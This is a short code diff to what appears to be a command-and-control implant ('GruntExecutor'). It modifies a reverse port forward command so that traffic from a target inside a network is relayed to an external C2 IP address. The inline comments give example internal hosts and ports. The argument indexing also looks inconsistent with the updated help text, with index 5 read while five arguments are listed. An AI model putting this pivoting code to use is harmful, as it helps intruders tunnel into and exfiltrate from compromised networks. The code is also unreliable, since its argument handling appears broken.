@@ -469,7 +469,7 @@ namespace GruntExecutor
                     
                     string comm;
                     string func;
-                    string[] commands = {"","","","",""};
+                    string[] commands = {""};
 
                     int index = Command.IndexOf(' ');
                     if (index == -1){
@@ -504,11 +504,11 @@ namespace GruntExecutor
                              output += ShowReversePortForwwrds();
                              break;
                         case "start":
-                             ip = commands[3];
-                             bind_port = commands[0];
-                             target_ip = commands[1];
-                             target_port = commands[2];
-                             random_port = commands[4];
+                             ip = commands[5]; //C2 external ip
+                             bind_port = commands[0]; //8080
+                             target_ip = commands[1]; //192.168.99.34
+                             target_port = commands[2]; //80
+                             random_port = commands[4]; //random
                              output += AddPortForward(ip, bind_port, target_port, target_ip, random_port);
                              break;
                         //case "stop":
@@ -525,7 +525,7 @@ namespace GruntExecutor
 
                             output += "[+] start \r\n";
                             output += "[+] Starts a new reverse port forward.\r\n";
-                            output += "[+] start [bind port] [forward host] [forward port] [allow ip]\r\n\r\n";
+                            output += "[+] start [bind port] [forward host] [forward port] [allow ip] [C2 ip]\r\n\r\n";
 
                             output += "[+] Stop\r\n";
                             output += "[+] Stops an existing reverse port forward.\r\n";
@@ -541,7 +541,7 @@ namespace GruntExecutor
 
                             output += "[+] start \r\n";
                             output += "[+] Starts a new reverse port forward.\r\n";
-                            output += "[+] start [bind port] [forward host] [forward port] [allow ip]\r\n\r\n";
+                            output += "[+] start [bind port] [forward host] [forward port] [allow ip] [C2 ip]\r\n\r\n";
 
                             output += "[+] Stop\r\n";
                             output += "[+] Stops an existing reverse port forward.\r\n";
